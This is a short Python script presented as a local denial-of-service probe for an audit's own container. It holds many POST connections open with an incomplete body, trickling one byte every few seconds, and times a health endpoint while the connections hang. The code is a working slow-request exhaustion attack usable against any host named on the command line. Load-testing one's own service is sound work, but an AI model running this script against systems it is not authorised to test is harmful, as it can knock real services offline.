"""Local DoS probe against the audit's own container: N requests send headers + a tiny part of the body and stall."""
import socket, sys, time, urllib.request
host, port, n, hold = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])
socks = []
for i in range(n):
    s = socket.create_connection((host, port))
    s.sendall(f"POST /api/v1/session HTTP/1.1\r\nHost: {host}:{port}\r\nOrigin: http://{host}:{port}\r\nContent-Type: application/json\r\nContent-Length: 15000\r\n\r\n{{".encode())
    socks.append(s)
time.sleep(0.5)
def probe():
    t = time.perf_counter()
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/health/live", timeout=10) as r:
            r.read(); return f"{r.status} nach {(time.perf_counter()-t)*1000:.0f} ms"
    except Exception as e:
        return f"FEHLER {type(e).__name__} nach {(time.perf_counter()-t)*1000:.0f} ms"
print(f"{n} haengende Requests offen; /health/live:", probe())
end = time.time() + hold
while time.time() < end:
    time.sleep(5)
    alive = 0
    for s in socks:
        try:
            s.sendall(b" "); alive += 1
        except OSError:
            pass
    print(f"t+{hold-(end-time.time()):.0f}s: {alive}/{n} Verbindungen noch offen; /health/live:", probe())
for s in socks: s.close()
print("geschlossen; /health/live:", probe())
